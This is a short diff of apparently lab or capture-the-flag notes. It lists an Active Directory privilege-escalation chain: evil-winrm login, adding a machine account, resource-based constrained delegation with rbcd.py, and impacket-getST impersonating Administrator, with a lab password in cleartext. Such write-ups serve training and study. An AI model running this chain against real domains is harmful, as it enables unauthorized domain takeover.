@@ -36,5 +36,5 @@ evil-winrm -i 192.168.2.9 -u 'valentin.badanov_adm' -p 'PASS'
 
 impacket-addcomputer -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 192.168.2.9 odeby.cdb/valentin.badanov_adm:'Ya]fBdUJl[/%2zC\GNw' -no-add
 python3 rbcd.py -f EVILCOMPUTER -t HELIX -dc-ip 192.168.2.9 codeby.cdb\\valentin.badanov_adm:'Ya]fBdUJl[/%2zC\GNw' 
-impacket-getST -spn cifs/FAKE01.codeby.cdb -impersonate Administrator -dc-ip 192.168.2.9 codeby.cdb/EVILCOMPUTER$:ev1lP@sS
+impacket-getST -spn cifs/HELIX.codeby.cdb -impersonate Administrator -dc-ip 192.168.2.9 codeby.cdb/EVILCOMPUTER$:ev1lP@sS
 ```
